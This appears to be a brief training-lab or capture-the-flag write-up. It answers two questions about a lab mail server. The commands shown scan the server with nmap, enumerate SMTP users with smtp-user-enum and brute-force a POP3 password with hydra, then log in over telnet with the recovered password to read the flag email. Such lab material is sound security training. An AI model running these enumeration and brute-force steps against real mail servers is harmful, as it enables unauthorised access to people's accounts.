## What is the available username for the domain inlanefreight.htb in the SMTP server?
```
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.203.12

telnet 10.129.203.12 25
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.12
```

## Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.
```
hydra -l 'marlin@inlanefreight.htb' -P pws.list -f 10.129.203.12 pop3

telnet 10.129.203.12 110
USER marlin@inlanefreight.htb
PASS poohbear
LIST
RETR 1
```
